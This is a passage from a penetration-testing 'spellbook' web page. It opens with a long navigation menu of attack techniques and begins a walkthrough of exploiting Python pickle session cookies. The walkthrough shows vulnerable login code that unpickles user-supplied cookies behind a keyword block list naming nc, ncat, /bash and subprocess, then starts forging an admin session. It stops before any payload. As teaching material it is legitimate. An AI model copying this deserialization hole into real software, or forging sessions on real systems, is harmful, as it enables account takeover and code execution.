+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/crontab/" class="">
+      Crontab</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/enumeration/" class="">
+      Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/kubernetes/" class="">
+      Kubernetes</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/nfs/" class="">
+      Nfs</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/path-injection/" class="">
+      Path Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/python-library-hijack/" class="">
+      Python Library Hijack</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/linux/sudo/" class="">
+      Sudo</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-efbcbfa9a4f046750f9c164cae3b5c0b" class="toggle"  />
+    <label for="section-efbcbfa9a4f046750f9c164cae3b5c0b" class="flex">
+      <a role="button" class="">
+        Windows</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-30c877d7e6dbf04e89232795939c9472" class="toggle"  />
+    <label for="section-30c877d7e6dbf04e89232795939c9472" class="flex">
+      <a role="button" class="">
+        Special Privileges</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/alwaysinstallelevated/" class="">
+      Always Install Elevated</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/dnsadmins/" class="">
+      DNS Admins</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/event-log-readers/" class="">
+      Event Log Readers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/print-operators/" class="">
+      Print Operators</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/sebackupprivilege/" class="">
+      Se Backup Privilege</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/sedebugprivilege/" class="">
+      Se Debug Privilege</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/seimpersonateprivilege/" class="">
+      Se Impersonate Privilege</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/serestoreprivilege/" class="">
+      Se Restore Privilege</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/server-operators/" class="">
+      Server Operators</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/special-privileges/setakeownershipprivilege/" class="">
+      Se Take Ownership Privilege</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/credential-looting/" class="">
+      Credential Looting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/dpapi/" class="">
+      Dpapi</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/enumeration/" class="">
+      Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/printnightmare/" class="">
+      Print Nightmare</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/uac-bypass/" class="">
+      Uac Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/06.-privilege-escalation/windows/user-interactions/" class="">
+      User Interactions</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ad0adecc90d787090f7f3f2c668562f3" class="toggle"  />
+    <label for="section-ad0adecc90d787090f7f3f2c668562f3" class="flex">
+      <a role="button" class="">
+        07. Credential Looting</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/dump-lsass/" class="">
+      Dump Lsass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/dump-sam/" class="">
+      Dump Sam</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/kerberos-keytab---linux/" class="">
+      Kerberos Keytab Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/kerberos-kirbi---windows/" class="">
+      Kerberos Kirbi Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/laps/" class="">
+      Laps</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/07.-credential-looting/virtual-disks/" class="">
+      Virtual Disks</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2c02c5639835e2c5e10145947a8080b5" class="toggle"  />
+    <label for="section-2c02c5639835e2c5e10145947a8080b5" class="flex">
+      <a role="button" class="">
+        08. Discovery</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/08.-discovery/network-hosts/" class="">
+      Network Hosts</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/08.-discovery/password-policy/" class="">
+      Password Policy</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/08.-discovery/ping-sweep/" class="">
+      Ping Sweep</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/08.-discovery/user-enumeration/" class="">
+      User Enumeration</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-07686cc097df585dc242bc14dc089ca4" class="toggle"  />
+    <label for="section-07686cc097df585dc242bc14dc089ca4" class="flex">
+      <a role="button" class="">
+        09. Pivoting</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/chisel/" class="">
+      Chisel</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/dnscat2/" class="">
+      Dnscat2</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/ligolo-ng/" class="">
+      Ligolo Ng</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/metasploit/" class="">
+      Metasploit</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/port-forward/" class="">
+      Port Forward</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/09.-pivoting/ssh/" class="">
+      SSH</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-e1e0aa139ebb047bc9559800a509d69c" class="toggle"  />
+    <label for="section-e1e0aa139ebb047bc9559800a509d69c" class="flex">
+      <a role="button" class="">
+        10. Lateral Movement</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/adcs-attacks/" class="">
+      Adcs Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/bloodhound/" class="">
+      Bloodhound</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/dacl-abuse/" class="">
+      Dacl Abuse</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/dcsync/" class="">
+      Dcsync</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/enumeration/" class="">
+      Enumeration</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/impacket-exec/" class="">
+      Impacket *Exec</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/kerberoasting/" class="">
+      Kerberoasting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/kerberos/" class="">
+      Kerberos</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/nopac/" class="">
+      No Pac</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/ntlm-relay/" class="">
+      Ntlm Relay</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/password-spray---from-linux/" class="">
+      Password Spray From Linux</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/password-spray---from-windows/" class="">
+      Password Spray From Windows</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/rdp-session-hijacking/" class="">
+      Rdp Session Hijacking</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/relay-potato/" class="">
+      Relay Potato</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/10.-lateral-movement/runas/" class="">
+      Runas</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-0bb2b04e93944d81f8c46b09caf99f9f" class="toggle"  />
+    <label for="section-0bb2b04e93944d81f8c46b09caf99f9f" class="flex">
+      <a role="button" class="">
+        File Transfer</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/edge-cases/" class="">
+      Edge Cases</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/encrypted-transfer/" class="">
+      Encrypted Transfer</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/linux-target/" class="">
+      Linux Target</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/nginx/" class="">
+      Nginx</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/rdp/" class="">
+      Rdp</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/windows-target/" class="">
+      Windows Target</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/file-transfer/winrm/" class="">
+      Win Rm</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-27f3a00f046f423a04ef1a6857a1d881" class="toggle"  />
+    <label for="section-27f3a00f046f423a04ef1a6857a1d881" class="flex">
+      <a role="button" class="">
+        Misc</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/misc/interactive-shell/" class="">
+      Interactive Shell</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/misc/python-eval-bypass/" class="">
+      Python Eval Bypass</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/misc/tips-and-setup/" class="">
+      Tips and Setup</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c4c7affcc57db383fea3db37de311743" class="toggle"  />
+    <label for="section-c4c7affcc57db383fea3db37de311743" class="flex">
+      <a role="button" class="">
+        Password Crack</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/password-crack/hashcat/" class="">
+      Hashcat</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/password-crack/hashid/" class="">
+      Hash ID</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/password-crack/john/" class="">
+      John</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-693d6624a689f7e347a0baca206ef8ad" class="toggle"  />
+    <label for="section-693d6624a689f7e347a0baca206ef8ad" class="flex">
+      <a role="button" class="">
+        Syntax Cheatsheets</a>
+      <img src="/spellbook/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/cewl/" class="">
+      Cewl</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/metasploit/" class="">
+      Metasploit</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/nodejs/" class="">
+      Node Js</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/openssl/" class="">
+      Open Ssl</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/powershell/" class="">
+      Powershell</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/sed/" class="">
+      Sed</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/shell-fu/" class="">
+      Shell Fu</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/sql-syntax/" class="">
+      SQL Syntax</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/spellbook/syntax-cheatsheets/sqlmap/" class="">
+      Sqlmap</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/spellbook/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>Python</h3>
+
+  <label for="toc-control">
+    
+    <img src="/spellbook/icons/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#source-analysis">Source Analysis</a></li>
+    <li><a href="#privesc">Privesc</a></li>
+    <li><a href="#rce">RCE</a></li>
+    <li><a href="#yaml">YAML</a></li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><h1 id="python">Python<a class="anchor" href="#python">#</a></h1>
+<p>When we login to this webapp, we got a cookie like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">302</span> <span style="color:#a6e22e">Found</span>
+</span></span><span style="display:flex;"><span>Set-Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">auth_8bH3mjF6n9=gASVSgAAAAAAAACMCXV0aWwuYXV0aJSMB1Nlc3Npb26Uk5QpgZR9lCiMCHVzZXJuYW1llIwNZnJhbnoubXVlbGxlcpSMBHJvbGWUjAR1c2VylHViLg==</span></span></span></code></pre></div><p>We try to <code>base64</code> decode the cookie and it starts with the bytes <code>80 04 95</code> and ends with a <code>period</code>.
+Compare it to our cheatsheet at <a href="#black-box">#Black-Box</a>, this is python <code>Pickle</code> version 4 serialized object.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ echo gASVSgAAAAAAAACMCXV0aWwuYXV0aJSMB1Nlc3Npb26Uk5QpgZR9lCiMCHVzZXJuYW1llIwNZnJhbnoubXVlbGxlcpSMBHJvbGWUjAR1c2VylHViLg<span style="color:#f92672">==</span> | base64 -d | xxd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>00000000: <span style="color:#ae81ff">8004</span> 954a <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> <span style="color:#ae81ff">0000</span> 008c <span style="color:#ae81ff">0975</span> <span style="color:#ae81ff">7469</span>  ...J.........uti
+</span></span><span style="display:flex;"><span>00000010: 6c2e <span style="color:#ae81ff">6175</span> <span style="color:#ae81ff">7468</span> 948c <span style="color:#ae81ff">0753</span> <span style="color:#ae81ff">6573</span> <span style="color:#ae81ff">7369</span> 6f6e  l.auth...Session
+</span></span><span style="display:flex;"><span>00000020: <span style="color:#ae81ff">9493</span> <span style="color:#ae81ff">9429</span> <span style="color:#ae81ff">8194</span> 7d94 288c <span style="color:#ae81ff">0875</span> <span style="color:#ae81ff">7365</span> 726e  ...<span style="color:#f92672">)</span>..<span style="color:#f92672">}</span>.<span style="color:#f92672">(</span>..usern
+</span></span><span style="display:flex;"><span>00000030: 616d <span style="color:#ae81ff">6594</span> 8c0d <span style="color:#ae81ff">6672</span> 616e 7a2e 6d75 656c  ame...franz.muel
+</span></span><span style="display:flex;"><span>00000040: 6c65 <span style="color:#ae81ff">7294</span> 8c04 726f 6c65 948c <span style="color:#ae81ff">0475</span> <span style="color:#ae81ff">7365</span>  ler...role...use
+</span></span><span style="display:flex;"><span>00000050: <span style="color:#ae81ff">7294</span> <span style="color:#ae81ff">7562</span> 2e                             r.ub.</span></span></code></pre></div><h2 id="source-analysis">Source Analysis<a class="anchor" href="#source-analysis">#</a></h2>
+<p>This is the <code>/login</code> path in <code>app.py</code>. After we log in:</p>
+<ul>
+<li>It creates our session with our username <code>sess = util.auth.Session(request.form['username'])</code></li>
+<li>Convert the <code>sess</code> object into some string with <code>auth = util.auth.sessionToCookie(sess).decode()</code></li>
+<li>Set our session cookie to that string with <code>resp.set_cookie(util.config.AUTH_COOKIE_NAME, auth)</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/login&#34;</span>, methods <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> util<span style="color:#f92672">.</span>config<span style="color:#f92672">.</span>AUTH_COOKIE_NAME <span style="color:#f92672">in</span> request<span style="color:#f92672">.</span>cookies:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> util<span style="color:#f92672">.</span>auth<span style="color:#f92672">.</span>checkLogin(request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;username&#39;</span>], request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;password&#39;</span>]):
+</span></span><span style="display:flex;"><span>            resp <span style="color:#f92672">=</span> make_response(redirect(<span style="color:#e6db74">&#34;/&#34;</span>))
+</span></span><span style="display:flex;"><span>            sess <span style="color:#f92672">=</span> util<span style="color:#f92672">.</span>auth<span style="color:#f92672">.</span>Session(request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;username&#39;</span>])
+</span></span><span style="display:flex;"><span>            auth <span style="color:#f92672">=</span> util<span style="color:#f92672">.</span>auth<span style="color:#f92672">.</span>sessionToCookie(sess)<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>            resp<span style="color:#f92672">.</span>set_cookie(util<span style="color:#f92672">.</span>config<span style="color:#f92672">.</span>AUTH_COOKIE_NAME, auth)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> resp
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;login.html&#34;</span>)</span></span></code></pre></div><p>A little more digging in <code>util/auth.py</code>, and this is the code:</p>
+<ul>
+<li><code>Session</code> class makes a session object with <code>username</code> and <code>role</code></li>
+<li><code>sessionToCookie()</code> use pickle to serialize the session object, and base64 encode it</li>
+<li><code>cookieToSession()</code> do the opposite, base64 decode the cookie string and deserialize it</li>
+<li>Before deserialize cookie, it also filter bad words in the serialized object. If it finds one, it returns nothing</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Session</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__init__</span>(self, username):
+</span></span><span style="display:flex;"><span>        con <span style="color:#f92672">=</span> sqlite3<span style="color:#f92672">.</span>connect(config<span style="color:#f92672">.</span>DB_NAME)
+</span></span><span style="display:flex;"><span>        cur <span style="color:#f92672">=</span> con<span style="color:#f92672">.</span>cursor()
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> cur<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;SELECT username, role FROM users WHERE username = ?&#34;</span>, (username,))
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>username, self<span style="color:#f92672">.</span>role <span style="color:#f92672">=</span> res<span style="color:#f92672">.</span>fetchone()
+</span></span><span style="display:flex;"><span>        con<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getUsername</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>username
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getRole</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>role
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">isAdmin</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>role <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;admin&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sessionToCookie</span>(session):
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>dumps(session)
+</span></span><span style="display:flex;"><span>    b <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(p)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> b
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">cookieToSession</span>(cookie):
+</span></span><span style="display:flex;"><span>    b <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(cookie)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> badword <span style="color:#f92672">in</span> [<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;nc&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;ncat&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bash&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/sh&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;subprocess&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Popen&#34;</span>]:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> badword <span style="color:#f92672">in</span> b:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>loads(b)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> p</span></span></code></pre></div><h2 id="privesc">Privesc<a class="anchor" href="#privesc">#</a></h2>
+<p>We edit the <code>Session</code> class in <code>util/auth.py</code> a bit, since we don&rsquo;t have the database, and we also want to specify our own role.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Session</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__init__</span>(self, username):
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#con = sqlite3.connect(config.DB_NAME)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#cur = con.cursor()</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#res = cur.execute(&#34;SELECT username, role FROM users WHERE username = ?&#34;, (username,))</span>
